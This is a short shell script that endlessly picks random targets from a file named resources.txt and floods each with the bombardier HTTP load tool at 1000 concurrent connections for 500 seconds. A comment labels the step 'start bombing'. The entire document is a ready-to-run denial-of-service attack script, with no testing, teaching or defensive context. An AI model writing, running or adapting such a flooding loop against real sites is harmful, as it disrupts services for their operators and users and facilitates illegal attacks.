#!/bin/sh

while true; do
  # get random resource
  RESOURCE=$(shuf resources.txt | head -n1)

  # start bombing
  bombardier -c 1000 -d 500s -l $RESOURCE
done
